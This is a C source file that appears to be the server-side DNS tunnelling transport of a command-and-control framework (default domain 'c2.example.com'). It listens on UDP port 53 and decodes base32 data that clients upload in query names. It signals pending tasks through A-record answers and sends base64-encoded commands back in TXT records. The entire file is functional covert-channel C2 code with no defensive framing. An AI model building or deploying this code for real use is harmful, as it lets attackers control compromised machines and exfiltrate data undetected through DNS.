#define _POSIX_C_SOURCE 200112L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#include "transport.h"

/* =========================================================================
 * Configuration
 * ====================================================================== */

#ifndef DNS_SERVER_DOMAIN
#define DNS_SERVER_DOMAIN "c2.example.com"
#endif

#define DNS_MAX_PACKET    512
#define DNS_MAX_SESSIONS  64
#define DNS_RING_SIZE     65536     
#define DNS_MAX_LABEL     63
#define DNS_TYPE_A        1
#define DNS_TYPE_TXT      16
#define DNS_TXT_CHUNK     189      

#ifndef DNS_PORT
#define DNS_PORT 53
#endif

char g_dns_server_domain[256] = DNS_SERVER_DOMAIN;


/* =========================================================================
 * Base32 decode
 * ====================================================================== */

static int b32_decode(const char *in, size_t inlen,
                      uint8_t *out, size_t outmax)
{
    size_t oi = 0;
    int bits = 0;
    uint32_t accum = 0;

    for (size_t i = 0; i < inlen; i++) {
        int val;
        char c = in[i];
        if (c >= 'a' && c <= 'z')      val = c - 'a';
        else if (c >= 'A' && c <= 'Z') val = c - 'A';
        else if (c >= '2' && c <= '7') val = c - '2' + 26;
        else if (c == '=' || c == '.') continue;
        else return -1;

        accum = (accum << 5) | val;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            if (oi >= outmax) return -1;
            out[oi++] = (uint8_t)((accum >> bits) & 0xFF);
        }
    }
    return (int)oi;
}


/* =========================================================================
 * Base64 encode
 * ====================================================================== */

static const char b64_alpha[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64_encode(const uint8_t *in, size_t inlen,
                      char *out, size_t outmax)
{
    size_t oi = 0, i;
    for (i = 0; i + 2 < inlen; i += 3) {
        if (oi + 4 >= outmax) return -1;
        uint32_t v = ((uint32_t)in[i] << 16) |
                     ((uint32_t)in[i+1] << 8) | in[i+2];
        out[oi++] = b64_alpha[(v >> 18) & 0x3F];
        out[oi++] = b64_alpha[(v >> 12) & 0x3F];
        out[oi++] = b64_alpha[(v >>  6) & 0x3F];
        out[oi++] = b64_alpha[ v        & 0x3F];
    }
    if (i < inlen) {
        if (oi + 4 >= outmax) return -1;
        uint32_t v = (uint32_t)in[i] << 16;
        if (i + 1 < inlen) v |= (uint32_t)in[i+1] << 8;
        out[oi++] = b64_alpha[(v >> 18) & 0x3F];
        out[oi++] = b64_alpha[(v >> 12) & 0x3F];
        out[oi++] = (i + 1 < inlen) ? b64_alpha[(v >> 6) & 0x3F] : '=';
        out[oi++] = '=';
    }
    out[oi] = '\0';
    return (int)oi;
}


/* =========================================================================
 * Ring buffer
 * ====================================================================== */

typedef struct {
    uint8_t  data[DNS_RING_SIZE];
    volatile size_t head;   
    volatile size_t tail; 
} RingBuf;

static void ring_init(RingBuf *r) {
    r->head = r->tail = 0;
}

static size_t ring_avail(const RingBuf *r) {
    return (r->head - r->tail) % DNS_RING_SIZE;
}

static size_t ring_space(const RingBuf *r) {
    return DNS_RING_SIZE - 1 - ring_avail(r);
}

static int ring_write(RingBuf *r, const uint8_t *data, size_t len) {
    if (len > ring_space(r)) return -1;
    for (size_t i = 0; i < len; i++) {
        r->data[r->head % DNS_RING_SIZE] = data[i];
        r->head = (r->head + 1) % DNS_RING_SIZE;
    }
    return (int)len;
}

static int ring_read(RingBuf *r, uint8_t *out, size_t len) {
    size_t avail = ring_avail(r);
    if (len > avail) len = avail;
    for (size_t i = 0; i < len; i++) {
        out[i] = r->data[r->tail % DNS_RING_SIZE];
        r->tail = (r->tail + 1) % DNS_RING_SIZE;
    }
    return (int)len;
}


/* =========================================================================
 * DNS Session - maps a client session_id to ring buffers
 *
 * rx_ring: data uploaded by client (client->server)
 * tx_ring: data to send to client  (server->client)
 * ====================================================================== */

typedef struct {
    uint32_t   session_id;
    int        active;
    RingBuf    rx_ring;     
    RingBuf    tx_ring;     
    pthread_mutex_t   mu;
    pthread_cond_t    rx_cond;   
    time_t     last_seen;
    struct sockaddr_in client_addr; 
    int        accepted;     
} DnsSession;

static DnsSession  g_dns_sessions[DNS_MAX_SESSIONS];
static int         g_dns_nsessions = 0;
static pthread_mutex_t g_dns_session_mu = PTHREAD_MUTEX_INITIALIZER;

static DnsSession *dns_find_session(uint32_t sid) {
    for (int i = 0; i < g_dns_nsessions; i++) {
        if (g_dns_sessions[i].active && g_dns_sessions[i].session_id == sid)
            return &g_dns_sessions[i];
    }
    return NULL;
}

static DnsSession *dns_create_session(uint32_t sid,
                                       struct sockaddr_in *addr) {
    if (g_dns_nsessions >= DNS_MAX_SESSIONS) return NULL;

    DnsSession *s = &g_dns_sessions[g_dns_nsessions++];
    memset(s, 0, sizeof(*s));
    s->session_id = sid;
    s->active = 1;
    s->accepted = 0;
    ring_init(&s->rx_ring);
    ring_init(&s->tx_ring);
    pthread_mutex_init(&s->mu, NULL);
    pthread_cond_init(&s->rx_cond, NULL);
    s->last_seen = time(NULL);
    if (addr) s->client_addr = *addr;

    printf("[DNS-SRV] new session %08x\n", sid);
    return s;
}


/* =========================================================================
 * DNS format helpers
 * ====================================================================== */

static int dns_read_name(const uint8_t *pkt, int pktlen, int off,
                          char *out, size_t outmax)
{
    size_t oi = 0;
    int jumped = 0, save_off = 0;
    int max_jumps = 10;

    while (off < pktlen && max_jumps-- > 0) {
        uint8_t len = pkt[off];
        if (len == 0) { off++; break; }
        if ((len & 0xC0) == 0xC0) {
            if (!jumped) save_off = off + 2;
            jumped = 1;
            off = ((len & 0x3F) << 8) | pkt[off+1];
            continue;
        }
        off++;
        if (off + len > pktlen) return -1;
        if (oi > 0 && oi < outmax) out[oi++] = '.';
        for (int i = 0; i < len && oi < outmax - 1; i++)
            out[oi++] = (char)pkt[off + i];
        off += len;
    }
    out[oi] = '\0';
    return jumped ? save_off : off;
}

/* Build a DNS response for an A record query. */
static int dns_build_a_response(const uint8_t *query, int qlen,
                                 uint8_t *resp, size_t respmax,
                                 uint32_t ipv4_addr)
{
    if (qlen < 12 || respmax < (size_t)qlen + 16) return -1;

    /* Copy query as base, modify header */
    memcpy(resp, query, qlen);

    /* Set QR=1 (response), AA=1, RA=1, RCODE=0 */
    resp[2] = 0x85;  /* QR=1, Opcode=0, AA=1, TC=0, RD=1 */
    resp[3] = 0x80;  /* RA=1, Z=0, RCODE=0 */
    /* ANCOUNT = 1 */
    resp[6] = 0; resp[7] = 1;
    /* NSCOUNT = 0, ARCOUNT = 0 */
    resp[8] = 0; resp[9] = 0;
    resp[10] = 0; resp[11] = 0;

    int off = qlen;

    /* Answer: pointer to question name (0xC00C) */
    resp[off++] = 0xC0; resp[off++] = 0x0C;
    /* TYPE = A */
    resp[off++] = 0; resp[off++] = 1;
    /* CLASS = IN */
    resp[off++] = 0; resp[off++] = 1;
    /* TTL = 0 (no caching!) */
    resp[off++] = 0; resp[off++] = 0;
    resp[off++] = 0; resp[off++] = 0;
    /* RDLENGTH = 4 */
    resp[off++] = 0; resp[off++] = 4;
    /* RDATA = IPv4 address (network byte order) */
    memcpy(resp + off, &ipv4_addr, 4);
    off += 4;

    return off;
}

/* Build a DNS response for a TXT record query. */
static int dns_build_txt_response(const uint8_t *query, int qlen,
                                   uint8_t *resp, size_t respmax,
                                   const char *txt_data, int txt_len)
{
    if (qlen < 12) return -1;
    size_t needed = (size_t)qlen + 14 + (size_t)txt_len;
    if (needed > respmax) return -1;

    memcpy(resp, query, qlen);
    resp[2] = 0x85;
    resp[3] = 0x80;
    resp[6] = 0; resp[7] = 1;  /* ANCOUNT=1 */
    resp[8] = 0; resp[9] = 0;
    resp[10] = 0; resp[11] = 0;

    int off = qlen;

    resp[off++] = 0xC0; resp[off++] = 0x0C;
    /* TYPE = TXT */
    resp[off++] = 0; resp[off++] = 16;
    /* CLASS = IN */
    resp[off++] = 0; resp[off++] = 1;
    /* TTL = 0 */
    resp[off++] = 0; resp[off++] = 0;
    resp[off++] = 0; resp[off++] = 0;

    uint16_t rdlen = (uint16_t)(1 + txt_len);
    resp[off++] = (uint8_t)(rdlen >> 8);
    resp[off++] = (uint8_t)(rdlen & 0xFF);
    /* TXT string: length-prefixed */
    resp[off++] = (uint8_t)txt_len;
    memcpy(resp + off, txt_data, txt_len);
    off += txt_len;

    return off;
}


/* =========================================================================
 * DNS query dispatcher
 *
 * Parses the query name, identifies the request type (poll/upload/download),
 * extracts session_id and data, dispatches to the right handler.
 * ====================================================================== */

static void dns_handle_query(int udp_fd,
                              const uint8_t *query, int qlen,
                              struct sockaddr_in *client_addr,
                              socklen_t addrlen)
{
    if (qlen < 12) return;

    /* Parse query name */
    char qname[512];
    int off = dns_read_name(query, qlen, 12, qname, sizeof(qname));
    if (off < 0) return;

    /* Parse QTYPE */
    if (off + 4 > qlen) return;
    uint16_t qtype = ((uint16_t)query[off] << 8) | query[off+1];

    
    char *labels[32];
    int nlabels = 0;
    char qname_copy[512];
    strncpy(qname_copy, qname, sizeof(qname_copy) - 1);
    qname_copy[sizeof(qname_copy) - 1] = '\0';

    /* Tokenize by dots */
    char *saveptr1;
    char *tok = strtok_r(qname_copy, ".", &saveptr1);
    while (tok && nlabels < 32) {
        labels[nlabels++] = tok;
        tok = strtok_r(NULL, ".", &saveptr1);
    }

    int domain_labels = 0;
    {
        char dom_copy[256];
        strncpy(dom_copy, g_dns_server_domain, sizeof(dom_copy) - 1);
        dom_copy[sizeof(dom_copy) - 1] = '\0';
        char *saveptr2;
        char *dt = strtok_r(dom_copy, ".", &saveptr2);
        while (dt) { domain_labels++; dt = strtok_r(NULL, ".", &saveptr2); }
    }

    int proto_labels = nlabels - domain_labels;
    if (proto_labels < 2) {
        return;
    }

    char *marker = labels[proto_labels - 1];
    char *session_hex = labels[proto_labels - 2];

    /* Parse session_id */
    uint32_t sid = (uint32_t)strtoul(session_hex, NULL, 16);

    /* Get or create session */
    pthread_mutex_lock(&g_dns_session_mu);
    DnsSession *sess = dns_find_session(sid);
    if (!sess) {
        sess = dns_create_session(sid, client_addr);
    }
    pthread_mutex_unlock(&g_dns_session_mu);

    if (!sess) return;

    sess->last_seen = time(NULL);
    sess->client_addr = *client_addr;

    uint8_t resp[DNS_MAX_PACKET];
    int rlen = -1;

    /* ---- POLL: <nonce>.<session>.p.<domain> ---- */
    if (strcmp(marker, "p") == 0 && qtype == DNS_TYPE_A) {
        pthread_mutex_lock(&sess->mu);
        int has_data = (ring_avail(&sess->tx_ring) > 0) ? 1 : 0;
        pthread_mutex_unlock(&sess->mu);

        /* Respond with A record: 0.0.0.0 = no data, 0.0.0.1 = data */
        uint32_t ip;
        uint8_t *ipb = (uint8_t *)&ip;
        ipb[0] = 0; ipb[1] = 0; ipb[2] = 0;
        ipb[3] = (uint8_t)has_data;

        rlen = dns_build_a_response(query, qlen, resp, sizeof(resp), ip);
    }

    /* ---- UPLOAD: <b32data>.<idx>.<tot>.<session>.u.<domain> ---- */
    else if (strcmp(marker, "u") == 0) {
        if (proto_labels < 5) goto respond;

        /* Concatenate base32 data labels */
        char b32_concat[512];
        int b32_pos = 0;
        int data_label_count = proto_labels - 4;
        for (int i = 0; i < data_label_count; i++) {
            int ll = (int)strlen(labels[i]);
            if (b32_pos + ll >= (int)sizeof(b32_concat)) break;
            memcpy(b32_concat + b32_pos, labels[i], ll);
            b32_pos += ll;
        }
        b32_concat[b32_pos] = '\0';

        /* Decode base32 */
        uint8_t decoded[256];
        int dlen = b32_decode(b32_concat, b32_pos, decoded, sizeof(decoded));
        if (dlen > 0) {
            pthread_mutex_lock(&sess->mu);
            ring_write(&sess->rx_ring, decoded, (size_t)dlen);
            pthread_cond_signal(&sess->rx_cond);
            pthread_mutex_unlock(&sess->mu);
        }

        /* ACK with A record */
        uint32_t ip = 0;
        uint8_t *ipb = (uint8_t *)&ip;
        ipb[0] = 0; ipb[1] = 0; ipb[2] = 0; ipb[3] = 1;
        rlen = dns_build_a_response(query, qlen, resp, sizeof(resp), ip);
    }

    /* ---- DOWNLOAD: <seq>.<session>.d.<domain> ---- */
    else if (strcmp(marker, "d") == 0 && qtype == DNS_TYPE_TXT) {
        pthread_mutex_lock(&sess->mu);
        size_t avail = ring_avail(&sess->tx_ring);

        if (avail > 0) {
            /* Read up to DNS_TXT_CHUNK bytes from tx_ring */
            uint8_t raw[DNS_TXT_CHUNK];
            int nread = ring_read(&sess->tx_ring, raw,
                                  avail > DNS_TXT_CHUNK ? DNS_TXT_CHUNK : avail);
            pthread_mutex_unlock(&sess->mu);

            /* Base64 encode */
            char b64[512];
            int b64len = b64_encode(raw, (size_t)nread, b64, sizeof(b64));
            if (b64len > 0) {
                rlen = dns_build_txt_response(query, qlen, resp,
                                               sizeof(resp), b64, b64len);
            }
        } else {
            pthread_mutex_unlock(&sess->mu);
            /* No data - respond with "NODATA" */
            rlen = dns_build_txt_response(query, qlen, resp,
                                           sizeof(resp), "NODATA", 6);
        }
    }

respond:
    if (rlen > 0) {
        sendto(udp_fd, resp, rlen, 0,
               (struct sockaddr *)client_addr, addrlen);
    }
}


/* =========================================================================
 * DNS listener thread
 *
 * Runs the UDP server on port 53. Receives DNS queries and dispatches
 * them to dns_handle_query. This is the equivalent of the TCP
 * listener_thread but for DNS.
 * ====================================================================== */

typedef struct {
    int          udp_fd;
    volatile int active;
    pthread_t    thread;
} DnsListenerState;

static DnsListenerState g_dns_listener = { -1, 0 };

static void *dns_listener_thread(void *arg)
{
    DnsListenerState *ls = (DnsListenerState *)arg;

    printf("[DNS-SRV] listener started on UDP port %d\n", DNS_PORT);

    while (ls->active) {
        uint8_t buf[DNS_MAX_PACKET];
        struct sockaddr_in client_addr;
        socklen_t addrlen = sizeof(client_addr);

        int n = recvfrom(ls->udp_fd, buf, sizeof(buf), 0,
                         (struct sockaddr *)&client_addr, &addrlen);
        if (n <= 0) {
            if (!ls->active) break;
            continue;
        }

        dns_handle_query(ls->udp_fd, buf, n, &client_addr, addrlen);
    }

    printf("[DNS-SRV] listener stopped\n");
    return NULL;
}


/* =========================================================================
 * transport_conn for DNS (server side)
 *
 * Wraps a DnsSession. The rest of the server (handle_connection)
 * uses trans->send()/recv() which read/write the session ring buffers.
 * ====================================================================== */

struct transport_conn {
    DnsSession *session;
};


/* =========================================================================
 * Transport vtable: listen
 *
 * Opens UDP socket on the given port. Starts dns_listener_thread.
 * Returns a pseudo-fd (always 0 for the single DNS listener).
 * ====================================================================== */

static int dns_listen(int port)
{
    if (g_dns_listener.active) {
        fprintf(stderr, "[DNS-SRV] listener already running\n");
        return -1;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("[DNS-SRV] socket"); return -1; }

    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons((uint16_t)(port > 0 ? port : DNS_PORT));

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("[DNS-SRV] bind");
        close(fd);
        return -1;
    }

    g_dns_listener.udp_fd = fd;
    g_dns_listener.active = 1;

    if (pthread_create(&g_dns_listener.thread, NULL,
                       dns_listener_thread, &g_dns_listener) != 0) {
        perror("[DNS-SRV] pthread_create");
        close(fd);
        g_dns_listener.active = 0;
        return -1;
    }
    pthread_detach(g_dns_listener.thread);

    printf("[DNS-SRV] listening on UDP port %d, domain=%s\n",
           port > 0 ? port : DNS_PORT, g_dns_server_domain);

    return 0;  /* pseudo-fd */
}


/* =========================================================================
 * Transport vtable: accept
 *
 * Blocks until a new (un-accepted) DNS session appears.
 * Returns a transport_conn wrapping that session.
 * ====================================================================== */

static transport_conn_t *dns_accept(int listener_fd,
                                     struct sockaddr_in *out_addr)
{
    (void)listener_fd;

    /* Poll for un-accepted sessions */
    while (1) {
        pthread_mutex_lock(&g_dns_session_mu);
        for (int i = 0; i < g_dns_nsessions; i++) {
            DnsSession *s = &g_dns_sessions[i];
            if (s->active && !s->accepted) {
                s->accepted = 1;
                pthread_mutex_unlock(&g_dns_session_mu);

                if (out_addr)
                    *out_addr = s->client_addr;

                transport_conn_t *conn = calloc(1, sizeof(*conn));
                if (!conn) return NULL;
                conn->session = s;

                printf("[DNS-SRV] accepted session %08x\n", s->session_id);
                return conn;
            }
        }
        pthread_mutex_unlock(&g_dns_session_mu);

        /* No new session yet - wait a bit */
        usleep(100000);  /* 100ms */
    }
}


/* =========================================================================
 * Transport vtable: send (server -> client)
 *
 * Writes data into the session's tx_ring. The DNS listener thread
 * will deliver it to the client in TXT responses when the client polls.
 * ====================================================================== */

static int dns_send(transport_conn_t *conn,
                     const uint8_t *buf, size_t len)
{
    if (!conn || !conn->session || !buf) return -1;

    DnsSession *s = conn->session;
    pthread_mutex_lock(&s->mu);

    /* Wait until there's enough space in tx_ring */
    while (ring_space(&s->tx_ring) < len) {
        pthread_mutex_unlock(&s->mu);
        usleep(50000);  /* 50ms */
        pthread_mutex_lock(&s->mu);
    }

    int written = ring_write(&s->tx_ring, buf, len);
    pthread_mutex_unlock(&s->mu);

    return written;
}


/* =========================================================================
 * Transport vtable: recv (client -> server)
 *
 * Reads data from the session's rx_ring. Blocks until `len` bytes
 * are available (data arrives when the DNS listener processes uploads).
 * ====================================================================== */

static int dns_recv(transport_conn_t *conn,
                     uint8_t *buf, size_t len)
{
    if (!conn || !conn->session || !buf) return -1;

    DnsSession *s = conn->session;
    size_t total = 0;

    while (total < len) {
        pthread_mutex_lock(&s->mu);

        size_t avail = ring_avail(&s->rx_ring);
        if (avail > 0) {
            size_t want = len - total;
            if (want > avail) want = avail;
            ring_read(&s->rx_ring, buf + total, want);
            total += want;
            pthread_mutex_unlock(&s->mu);
        } else {
            /* Wait for data from DNS uploads */
            struct timespec ts;
            clock_gettime(CLOCK_REALTIME, &ts);
            ts.tv_sec += 5;  /* 5 second wait */
            pthread_cond_timedwait(&s->rx_cond, &s->mu, &ts);
            pthread_mutex_unlock(&s->mu);
        }
    }
    return (int)total;
}


/* =========================================================================
 * Transport vtable: poll
 * ====================================================================== */

static int dns_poll(transport_conn_t *conn, int timeout_ms)
{
    if (!conn || !conn->session) return -1;

    DnsSession *s = conn->session;
    int elapsed = 0;

    while (elapsed < timeout_ms) {
        pthread_mutex_lock(&s->mu);
        int avail = (ring_avail(&s->rx_ring) > 0) ? 1 : 0;
        pthread_mutex_unlock(&s->mu);

        if (avail) return 1;
        usleep(50000);
        elapsed += 50;
    }
    return 0;
}


/* =========================================================================
 * Transport vtable: close
 * ====================================================================== */

static void dns_close(transport_conn_t *conn)
{
    if (!conn) return;
    if (conn->session) {
        conn->session->active = 0;
        printf("[DNS-SRV] session %08x closed\n",
               conn->session->session_id);
    }
    free(conn);
}


static void dns_close_listener(int listener_fd)
{
    (void)listener_fd;
    if (g_dns_listener.active) {
        g_dns_listener.active = 0;
        close(g_dns_listener.udp_fd);
        g_dns_listener.udp_fd = -1;
        printf("[DNS-SRV] listener stopped\n");
    }
}

static int dns_get_fd(transport_conn_t *conn)
{
    (void)conn;
    return -1;
}


/* =========================================================================
 * DNS domain configuration
 * ====================================================================== */

void dns_server_set_domain(const char *domain)
{
    strncpy(g_dns_server_domain, domain, sizeof(g_dns_server_domain) - 1);
    g_dns_server_domain[sizeof(g_dns_server_domain) - 1] = '\0';
}


/* =========================================================================
 * Transport Registration
 * ====================================================================== */

transport_t TRANSPORT_DNS = {
    .name           = "dns",
    .listen         = dns_listen,
    .connect        = NULL,          /* server doesn't connect out via DNS */
    .accept         = dns_accept,
    .send           = dns_send,
    .recv           = dns_recv,
    .poll           = dns_poll,
    .close          = dns_close,
    .close_listener = dns_close_listener,
    .get_fd         = dns_get_fd,
};